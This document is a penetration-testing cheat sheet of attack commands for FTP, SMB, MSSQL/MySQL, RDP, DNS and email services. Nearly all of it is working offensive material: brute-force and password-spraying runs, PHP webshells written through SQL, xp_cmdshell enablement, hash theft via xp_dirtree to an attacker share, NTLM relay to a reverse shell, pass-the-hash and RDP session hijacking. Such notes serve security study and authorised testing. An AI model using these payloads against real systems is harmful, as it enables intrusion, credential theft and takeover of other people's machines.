# FTP
---
```bash
sudo nmap -sC -sV -p 21 <ip>
(Enumerate ftp service, even if does not appear anonymous it can be vulnerable)

ftp <ip>
(login with anonymous login)

medusa -u <username> -P <wordlist> -h <ip> -M ftp
(Brute-force)

hydra -L <username.list> -P <passwordlist> ftp://<ip> -s <port>
(Brute-force with hydra non-default ip)

nmap -Pn -v -n -p80 -b anonymous:password@<external_ip> <internal_ip_to_bounce>
(Perform a FTP bounce attack with -b flag on nmap)

Browser Connection: ftp://anonymous:anonymous@<ip>

**Anonymous logins**
anonymous : anonymous
anonymous : <empty>
ftp : ftp

**Commands**
BYE or CLOSE or QUIT - terminates a session
CD - changes the current directory on host server
CWD - changes diretory to the specified remote dir
DIR - Requests a directory of files uploaded or available for download
GET - Downloads a single file
USER - Specifies the username
PASS - Specifies the pass
LS - Requests a list of file names uploaded or available for download
MGET - Download multiple files
MPUT - Uploads multiple files
PUT - Uploads a single file
PWD - Queries the current working dir
REN - Renames or moves a file
SITE - Executes a site specific command
OPEN - Starts an ftp connection
PASV - Server enters passivce mode, in which the server waits for the client to establish a connection rather than attempting to connect to a port the client specifies
HELP - Gets commands available

**Latest FTP vulnerabilities**
CoreFTP before build 727
curl -k -X PUT -H "Host: <IP>" --basic -u <username>:<password> --data-binary "<content>" --path-as-is https://<IP>/../../../../../../<filename>
(Directory traversal (for file creation) by an authenticated attacker)
```
# SMB
---
```bash
sudo nmap <ip> -sV -sC -p139,445
(Enumerate smb)

smbclient -N -L //<ip>
(Anonymous authentication)

smbclient -U <user> \\\\<ip>\\<SHARENAME>
(Authentication)

smbmap -H <ip>
(Another tool for share enumeration)

smbmap -H <ip> -r <share>
(Browse directories)

smbmap -H <ip> --download "<share>\<file>"
(Download file from shared folder)

smbmap -H <ip> --upload <file> "<share>\<file>"
(Upload file from host to share folder)

rpcclient -U'%' <ip>
(Enumerate a workstation or Domain Controller)
enumdomusers - Enumerate users
enumalsgroups domain - Enumerate domain groups
enumalsgroups builtin - Enumerate local system groups
enumdomains - Enumerate domain information
enumprivs - Enumerate user system privileges
lookupnames username - Identify the SID for the username
queryuser RID# - Identify user information for the given user relative ID number

./enum4linux-ng.py <ip> -A -C
(Enumerate with enum4linux)

crackmapexec smb <ip> -u <userlist> -p <passwordlist> --local-auth
(Brute force)

impacket-psexec <username>:<password>@<ip>
(Execute commands smb)

crackmapexec smb <ip> -u <user> -p <password> -x '<command>' --exec-method smbexec
(Execute a command)

crackmapexec smb <ip>/24 -u <username> -p <password> --loggedon-users
(Enumerate Logged-on users on machines)

crackmapexec smb <ip> -u <user> -p <password> --sam
(Extract hashes from sam database)

crackmapexec smb <ip> -u <user> -H <hash>
(Use PtH with ntlm password)

**Forced Authentication Attacks**
responder -I <interface name>
(Create a fake smb service that when a user misstypes a sharefolder name it tries to connect with every sharefolder on the network including ours this way allowing us to capture the ntlm password, /usr/share/responder/logs/ (dir of saved hashes))
sudo impacket-smbserver <sharename> ./ -smb2support
(We can use impacket aswell)

hashcat -m 5600 <hash> <passwordlist>
(Crack NetNTLMv2 hash(user::domain:string:hash:hash))
OR
john --wordlist=<wordlist> <hashfile>

If we can't crack the hash we nned to edit SMB to Off on /etc/responder/Responder.conf

impacket-ntlmrelayx --no-http-server -smb2support -t <target>
(Get sam database of target)

impacket-ntlmrelayx --no-http-server -smb2support -t <ip> -c '<revshellpowershell>'
(Try to get a reverse shell use Powershell#3 from revshells)

**Latest SMB Vulnerabilities**
SMBGhost (https://www.exploit-db.com/exploits/48537) <- POC
```
# SQL AND MSSQL
---
```bash
Default ports
MSSQL - 1433 1434
MySQL - 3306 2433(Hidden Mode)

nmap -Pn -sV -sC -p1433 <ip>
(Enumerate, banner grabbing)

mysql -u <username> -p<password> -h <ip>
(Authentication SQL)

sqlcmd -S <ip> -U <username> -P '<password>' -y 30 -Y 30
(Authentication via powershell MSSQL)

sqsh -S <ip> -U <username> -P '<password>' -h
(Authentication via linux MSSQL)

mssqlclient.py -p 1433 <username>@<ip>
(Authentication via impacket tool MSSQL)

mssqlclient.py <user>@<ip> -windows-auth
(via windows authentication)

sqsh -S <ip> -U <servernameor.>\\<username> -P '<password>' -h
(Windows authentication)

**MySQL Commands**
SHOW DATABASES; - Show databases
USE <database>; - Choose a database to use
SHOW TABLES; - Show tables in a database
SELECT <columns> FROM <table>; - Select columns from a table;

**MSSQL Commands**
SELECT name FROM sys.databases - Show databases
SELECT TABLE_CATALOG AS 'db_name', TABLE_NAME AS 'table' FROM information_schema.tables WHERE TABLE_TYPE = 'BASE TABLE' - Show tables on the database
SELECT name FROM sys.databases WHERE HAS_DBACCESS(name) = 1 - Show databases my user has access 
SELECT t.name AS TableName, p.rows AS RowCounts FROM sys.tables t JOIN sys.partitions p ON t.object_id = p.object_id WHERE p.index_id IN (0, 1) AND p.rows > 0 ORDER BY p.rows DESC - Show tables with entries

GO - Submit command MSSQL

**Payloads MySQL**
show variables like "secure_file_priv";
(If empty we can read and write data using mysql)

SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';
(Write local file)

select LOAD_FILE("/etc/passwd");
(Read local file)

**Payloads MSSQL**
XP_CMDSHELL '<command>'
GO
(Execute a command on MSSQL)

(If xp_cmdshell is disabled)
EXECUTE sp_configure 'show advanced options', 1
GO
RECONFIGURE
GO
EXECUTE sp_configure 'xp_cmdshell', 1
GO
RECONFIGURE
GO

DECLARE @OLE INT
DECLARE @FileID INT
EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1
EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>'
EXECUTE sp_OADestroy @FileID
EXECUTE sp_OADestroy @OLE
GO
(Create a file)

(If can't create a file)
sp_configure 'show advanced options', 1
GO
RECONFIGURE
GO
sp_configure 'Ole Automation Procedures', 1
GO
RECONFIGURE
GO

SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
GO
(Read local files)

(With Responder or impacket-smbserver to capture hashes from a fake share)
EXEC master..xp_dirtree '\\<attacker_ip>\<sharename>\'
GO
(Hash stealing dirtree)
EXEC master..xp_subdirs '\\<attacker_ip>\<sharename>\'
GO
(Hash stealing subdirs)

SELECT distinct b.name
FROM sys.server_permissions a
INNER JOIN sys.server_principals b
ON a.grantor_principal_id = b.principal_id
WHERE a.permission_name = 'IMPERSONATE'
GO
(Identify users that we can impersonate, this permission allows another user to impersonate another until the context is reset or the session ends)

SELECT SYSTEM_USER
SELECT IS_SRVROLEMEMBER('sysadmin')
GO
(Verify if user is sysadmin)

EXECUTE AS LOGIN = 'sa'
SELECT SYSTEM_USER
SELECT IS_SRVROLEMEMBER('sysadmin')
GO
(Impersonate SA user, move to the master db "USE master" because all users by default have acces to that one)

SELECT srvname, isremote FROM sysservers
GO
(Identify linked servers 1 is remote 0 is a linked, if we gain access to a SQL Server with linked server we may be able to move laterally in the database)

EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS]
GO
(Send pass-through commands to linked servers, we add our command between paranthesis and specify the linked server between square brackets.)

**Latest SQL Vulnerabilities*
Undocommented xp_dirtree that allow us to get hash using responder
```
# RDP
---
```bash
nmap -Pn -p3389 <ip>
(Enumeration)

crowbar -b rdp -s <ip>/32 -U <usernamefile> -c <passwordfile>
hydra -L <usernamefile> -p <passwordfile> <ip> rdp
(Brute-force)

xfreerdp /u:<username> /p:<password> /v:<ip>

query user
(See users logged using rdp)
tscon #{TARGET_SESSION_ID} /dest:#{OUR_SESSION_NAME}
(Open cmd as target_session_id user - need sysadmin rights)
sc.exe create sessionhijack binpath= "cmd.exe /k tscon <target_session_id> /dest:<our_session_name>"
(Create a service for session hijack - need sysadmin rights)
net start sessionhijack
(Start sessionhijack service)
Note: This method no longer works on Server 2019.

reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
(Enable PtH authentication on registry)
xfreerdp /u:<username> /pth:<hash> /v:<ip>
(Login with hash)

**Latest RDP Vulnerabilities**
BlueKeep that allows RCE execution
```
# DNS
---
```bash
nmap -p53 -Pn -sV -sC <ip>
(Enumeration)

dig AXFR @<nameserver> <domain>
(Zone transfer)
MORE (https://github.com/cybb0rg/redteam-notes/blob/main/CMD%20-%20Information%20Gather%20WEB.md)

fierce --domain <domain>
(Tool to enumerate dns servers and scan dns zone transfer)

./subfinder -d <domain> -v
(Subdomain enumeration)

git clone https://github.com/TheRook/subbrute.git >> /dev/null 2>&1
cd subbrute
echo "<nameserver>" > ./resolvers.txt
python3 subbrute.py <domain> -s ./names.txt -r ./resolvers.txt
(Use self-defined resolvers and perform pure DNS brute-forcing during internal pentests)
host support.inlanefreight.com
(Using this command host or nslookup we can see the CNAME of this URL)
Domain/Subdomain Takeover: https://github.com/EdOverflow/can-i-take-over-xyz

DNS Cache Poisoning using Ettercap or Bettercap.

**Latest DNS Vulnerabilities**
Domain and Subdomain Takeover
```
# Email Services
---
```bash
host -t MX <domain>
(Enumerate with host)
dig mx <domain> | grep "MX" | grep -v ";"
(Enumerate with dig)
host -t A <mailserver>
(Get ipv4 of email server)

sudo nmap -Pn -sV -sC -p25,143,110,465,587,993,995 <ip>
(Enumerate Email services ports on web server)

telnet <ip> 25
(Connect to SMTP server)

**SMTP Commands**
VRFY <user> - check if username exists
EXPN <user/group> - List all users on a list
MAIL FROM:<email> - Set sender email
RCPT TO:<user> - If user exists says Recipient ok

**POP3 Commands**
USER <user> - If says ok user exists
PASS <password> - set password
LIST - list all emails in inbox
RETR 1 - Retrieves first email
DELE 1 - Delete first email
QUIT - Close session

smtp-user-enum -M RCPT/VRFY/EXPN -U <userlist> -D <domainforemail> -t <ip>
(Enumerate users auto)

python3 o365spray.py --validate --domain <domain>
(Validate if target uses o365)

python3 o365spray.py --enum -U <userlist> --domain <domain>
(Enumerate usernames)

hydra -L <userlist@domain> -P <passwordlist> -f <ip> pop3
(Brute-force email)

python3 o365spray.py --spray -U usersfound.txt -p <passwordlist> --count 1 --lockout 1 --domain <domain>
(Perform password-spraying with users found)

nmap -p25 -Pn --script smtp-open-relay <ip>
(Check if open relay is open)

swaks --from <fromeail> --to <toemail> --header '<subject>' --body '<message>' --server <ip>
(Send an email through a webserver if open relay is open we can send through the target ip)

**Latest email vulnerabilties**
OpenSMTPD up to v6.6.2 allows rce
```